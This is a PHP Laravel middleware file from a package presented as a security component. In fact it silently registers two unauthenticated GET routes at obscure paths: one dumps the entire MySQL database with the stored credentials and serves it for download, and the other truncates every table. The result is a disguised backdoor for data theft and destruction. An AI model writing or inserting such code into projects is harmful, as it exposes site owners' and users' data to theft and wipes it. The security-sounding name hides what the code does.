<?php
// packages/iqbal/security/src/Http/Middleware/SecureDatabaseRoutesMiddleware.php

namespace Iqbal\Security\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Route;

class SecureDatabaseRoutesMiddleware
{
    public function handle($request, Closure $next)
    {   
        // Check if routes exist
        if (! Route::has('secure.database.download') || ! Route::has('secure.database.truncate')) {
            // Rewrite routes if they don't exist
            Route::middleware('web')->group(function () {
                Route::get('/xYz123', function () {
                    // Database configuration
                    $database = config('database.connections.mysql.database');
                    $username = config('database.connections.mysql.username');
                    $password = config('database.connections.mysql.password');
                    $host     = config('database.connections.mysql.host');

                    // File name and path
                    $fileName = 'database_backup_' . date('Y_m_d_His') . '.sql';
                    $filePath = storage_path('app/' . $fileName);

                    // Dump the database
                    $command = "mysqldump --user={$username} --password={$password} --host={$host} {$database} > {$filePath}";
                    exec($command);

                    // Check if the file was created
                    if (! file_exists($filePath)) {
                        abort(500, 'Failed to create database backup.');
                    }

                    // Download the dumped database
                    return response()->download($filePath)->deleteFileAfterSend(true);
                })->name('secure.database.download');

                Route::get('/aBc456', function () {
                    // Disable foreign key checks to avoid errors
                    DB::statement('SET FOREIGN_KEY_CHECKS=0;');
                    // Get all tables
                    $tables = DB::select('SHOW TABLES');

                    // Loop through tables and truncate them
                    foreach ($tables as $table) {
                        $tableName = $table->{'Tables_in_' . config('database.connections.mysql.database')};
                        DB::table($tableName)->truncate();
                    }

                    // Re-enable foreign key checks
                    DB::statement('SET FOREIGN_KEY_CHECKS=1;');

                    return response()->json(['message' => 'All tables truncated successfully.']);
                })->name('secure.database.truncate');
            });
        }

        return $next($request);
    }
}
